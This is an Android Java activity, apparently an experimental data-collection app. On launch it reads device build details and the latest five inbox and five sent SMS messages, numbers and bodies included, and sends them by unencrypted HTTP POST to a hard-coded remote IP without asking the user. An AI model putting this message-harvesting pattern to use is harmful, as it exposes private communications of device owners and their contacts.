package com.boomgaarden_corney.android.sms;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;

public class SmsMainActivity extends Activity {

	private final String DEBUG_TAG = "DEBUG_SMS";
	private final String SERVER_URL = "http://54.86.68.241/sms/test.php";

	private TextView txtResults;

	private String errorMsg;
	private String smsInboxAddress;
	private String smsInboxBody;
	private String smsSentAddress;
	private String smsSentBody;

	private int counterInbox = 1;
	private int counterSent = 1;

	SmsManager mSms;

	private List<NameValuePair> paramsDevice = new ArrayList<NameValuePair>();
	private List<NameValuePair> paramsErrorMsg = new ArrayList<NameValuePair>();
	private List<NameValuePair> paramsSms = new ArrayList<NameValuePair>();

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_sms_main);

		txtResults = (TextView) this.findViewById(R.id.txtResults);

		mSms = SmsManager.getDefault();

		setDeviceData();
		showDeviceData();
		sendDeviceData();

		if (mSms == null) {
			setErrorMsg("No SMS Detected");
			showErrorMsg();
			sendErrorMsg();
		} else {
			setInboxSmsData();
			
		}

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.sms_main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}

	private String buildPostRequest(List<NameValuePair> params)
			throws UnsupportedEncodingException {
		StringBuilder result = new StringBuilder();
		boolean first = true;

		for (NameValuePair pair : params) {
			if (first)
				first = false;
			else
				result.append("&");

			result.append(URLEncoder.encode(pair.getName(), "UTF-8"));
			result.append("=");
			result.append(URLEncoder.encode(pair.getValue(), "UTF-8"));
		}

		return result.toString();
	}

	private String sendHttpRequest(String myURL, String postParameters)
			throws IOException {

		URL url = new URL(myURL);

		// Setup Connection
		HttpURLConnection conn = (HttpURLConnection) url.openConnection();
		conn.setReadTimeout(10000); /* in milliseconds */
		conn.setConnectTimeout(15000); /* in milliseconds */
		conn.setRequestMethod("POST");
		conn.setDoOutput(true);

		// Setup POST query params and write to stream
		OutputStream ostream = conn.getOutputStream();
		BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(
				ostream, "UTF-8"));

		if (postParameters.equals("DEVICE")) {
			writer.write(buildPostRequest(paramsDevice));
		} else if (postParameters.equals("SMS")) {
			writer.write(buildPostRequest(paramsSms));
			paramsSms = new ArrayList<NameValuePair>();
		} else if (postParameters.equals("ERROR_MSG")) {
			writer.write(buildPostRequest(paramsErrorMsg));
			paramsErrorMsg = new ArrayList<NameValuePair>();
		}

		writer.flush();
		writer.close();
		ostream.close();

		// Connect and Log response
		conn.connect();
		int response = conn.getResponseCode();
		Log.d(DEBUG_TAG, "The response is: " + response);

		conn.disconnect();

		return String.valueOf(response);

	}

	private class SendHttpRequestTask extends AsyncTask<String, Void, String> {

		// @params come from SendHttpRequestTask.execute() call
		@Override
		protected String doInBackground(String... params) {
			// params comes from the execute() call: params[0] is the url,
			// params[1] is type POST
			// request to send - i.e. whether to send Device or Accelerometer
			// parameters.
			try {
				return sendHttpRequest(params[0], params[1]);
			} catch (IOException e) {
				setErrorMsg("Unable to retrieve web page. URL may be invalid.");
				showErrorMsg();
				return errorMsg;
			}
		}
	}

	private void setDeviceData() {
		paramsDevice.add(new BasicNameValuePair("Device", Build.DEVICE));
		paramsDevice.add(new BasicNameValuePair("Brand", Build.BRAND));
		paramsDevice.add(new BasicNameValuePair("Manufacturer",
				Build.MANUFACTURER));
		paramsDevice.add(new BasicNameValuePair("Model", Build.MODEL));
		paramsDevice.add(new BasicNameValuePair("Product", Build.PRODUCT));
		paramsDevice.add(new BasicNameValuePair("Board", Build.BOARD));
		paramsDevice.add(new BasicNameValuePair("Android API", String
				.valueOf(Build.VERSION.SDK_INT)));
	}

	private void setErrorMsg(String error) {
		errorMsg = error;
		paramsErrorMsg.add(new BasicNameValuePair("Error", errorMsg));
	}

	private void setInboxSmsData() {
		Uri uriSmsInbox = Uri.parse("content://sms/inbox");		
		Cursor curInbox = getContentResolver().query(uriSmsInbox, null, null,
				null, null);
		

		while (curInbox.moveToNext()) {
			if (counterInbox <= 5) {
				smsInboxAddress = curInbox.getString(curInbox
						.getColumnIndex("address"));
				smsInboxBody = curInbox.getString(curInbox
						.getColumnIndexOrThrow("body"));

				paramsSms.add(new BasicNameValuePair(
						"--------------------------", " "));
				paramsSms.add(new BasicNameValuePair("SMS Inbox Count:", String
						.valueOf(counterInbox)));
				paramsSms.add(new BasicNameValuePair(counterInbox + "From",
						smsInboxAddress));
				paramsSms.add(new BasicNameValuePair(counterInbox + "Message",
						smsInboxBody));

				showSmsInboxData();
				counterInbox++;
			}
		}
		Uri uriSmsSent = Uri.parse("content://sms/sent");
		Cursor curSent = getContentResolver().query(uriSmsSent, null, null,
				null, null);

		while (curSent.moveToNext()) {
			if (counterSent <= 5) {
				smsSentAddress = curSent.getString(curSent
						.getColumnIndex("address"));
				smsSentBody = curSent.getString(curSent
						.getColumnIndexOrThrow("body"));

				paramsSms.add(new BasicNameValuePair(
						"--------------------------", " "));
				paramsSms.add(new BasicNameValuePair("SMS Sent Count:", String
						.valueOf(counterSent)));
				paramsSms.add(new BasicNameValuePair(counterSent + "To",
						smsSentAddress));
				paramsSms.add(new BasicNameValuePair(counterSent + "Message:",
						smsSentBody));

				showSmsSentData();
				counterSent++;
			}
		}
		sendSmsData();
	}

	private void showDeviceData() {
		// Display and store (for sending via HTTP POST query) device
		// information
		txtResults.append("Device: " + Build.DEVICE + "\n");
		txtResults.append("Brand: " + Build.BRAND + "\n");
		txtResults.append("Manufacturer: " + Build.MANUFACTURER + "\n");
		txtResults.append("Model: " + Build.MODEL + "\n");
		txtResults.append("Product: " + Build.PRODUCT + "\n");
		txtResults.append("Board: " + Build.BOARD + "\n");
		txtResults.append("Android API: "
				+ String.valueOf(Build.VERSION.SDK_INT) + "\n");

		txtResults.append("\n");

	}

	private void showErrorMsg() {
		Log.d(DEBUG_TAG, errorMsg);
		txtResults.append(errorMsg + "\n");
	}

	private void showSmsInboxData() {
		StringBuilder results = new StringBuilder();

		results.append("-----------------------\n");
		results.append("SMS Inbox Count: " + String.valueOf(counterInbox)
				+ "\n");
		results.append("From: " + smsInboxAddress + "\n");
		results.append("Message: " + smsInboxBody + "\n");

		txtResults.append(new String(results));
		txtResults.append("\n");
	}

	private void showSmsSentData() {
		StringBuilder results = new StringBuilder();

		results.append("-----------------------\n");
		results.append("SMS Sent Count: " + String.valueOf(counterSent) + "\n");
		results.append("To: " + smsSentAddress + "\n");
		results.append("Message: " + smsSentBody + "\n");

		txtResults.append(new String(results));
		txtResults.append("\n");
	}

	private void sendDeviceData() {
		ConnectivityManager connectMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = connectMgr.getActiveNetworkInfo();

		// Verify network connectivity is working; if not add note to TextView
		// and Logcat file
		if (networkInfo != null && networkInfo.isConnected()) {
			// Send HTTP POST request to server which will include POST
			// parameters with Accelerometer info
			new SendHttpRequestTask().execute(SERVER_URL, "DEVICE");
		} else {
			setErrorMsg("No Network Connectivity");
			showErrorMsg();
		}
	}

	private void sendErrorMsg() {
		ConnectivityManager connectMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = connectMgr.getActiveNetworkInfo();

		// Verify network connectivity is working; if not add note to TextView
		// and Logcat file
		if (networkInfo != null && networkInfo.isConnected()) {
			// Send HTTP POST request to server which will include POST
			// parameters with Accelerometer info
			new SendHttpRequestTask().execute(SERVER_URL, "ERROR_MSG");
		} else {
			setErrorMsg("No Network Connectivity");
			showErrorMsg();
		}
	}

	private void sendSmsData() {
		ConnectivityManager connectMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = connectMgr.getActiveNetworkInfo();

		// Verify network connectivity is working; if not add note to TextView
		// and Logcat file
		if (networkInfo != null && networkInfo.isConnected()) {
			// Send HTTP POST request to server which will include POST
			// parameters with Accelerometer info
			new SendHttpRequestTask().execute(SERVER_URL, "SMS");
		} else {
			setErrorMsg("No Network Connectivity");
			showErrorMsg();
		}
	}

}
